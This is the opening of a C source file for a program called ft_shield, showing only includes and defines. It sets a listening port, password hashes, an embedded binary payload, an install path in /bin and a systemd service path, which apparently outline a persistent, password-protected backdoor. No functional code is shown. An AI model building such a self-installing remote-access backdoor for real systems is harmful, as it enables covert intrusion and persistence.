#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <errno.h>
#include <string.h>
#include <sys/wait.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>
#include <sys/wait.h>
#include <signal.h>
#include <sys/stat.h>
#include <errno.h>
#include <openssl/sha.h>

#define PORT 4242
#define MAX_CLIENTS 3
#define BUFFER_SIZE 1024
#define LOCKFILE "/var/run/ft_shield.lock"

// SHA256 hashes of passwords
#define PASSWORD_HASH "73475cb40a568e8da8a045ced110137e159f890ac4da883b6b17dc651b3a8049"
#define ALT_PASSWORD_HASH "0315b4020af3eccab7706679580ac87a710d82970733b8719e70af9b57e7b9e6"

extern const char _binary_payload_start[];
extern const char _binary_payload_end[];

#define TARGET_PATH "/bin/ft_shield"
#define SERVICE_PATH "/etc/systemd/system/ft_shield.service"